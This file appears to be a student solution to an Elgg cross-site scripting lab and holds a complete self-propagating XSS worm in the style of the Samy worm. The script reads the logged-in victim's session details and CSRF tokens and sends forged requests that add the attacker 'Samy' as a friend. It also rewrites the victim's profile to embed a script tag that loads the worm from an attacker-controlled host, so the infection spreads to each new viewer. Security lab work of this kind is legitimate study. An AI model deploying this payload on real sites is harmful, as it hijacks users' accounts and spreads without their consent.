//<script type="text/javascript" src="http://www.xsslabattacker.com/xss_worm_link.js"></script>


window.onload = function () {
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.
	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
	

	samyGuid = 47
	if (elgg.session.user.guid!=samyGuid){
		var Ajax=null;
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		var userName=elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;


		var description = "&description=Infected!\n" + "<" + "script type=\"text/javascript\" src=\"http://www.xsslabattacker.com/xss_worm_link.js\">" + "</" + "script>";	

		var accesslevel = "&accesslevel[description]=2";
		//Construct the content of your url.
		var content=token + ts + userName + description + accesslevel + guid; 
		var samyGuid=47; 
		var sendurl="http://www.xsslabelgg.com/action/profile/edit";
		if(elgg.session.user.guid!=samyGuid)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}

	
}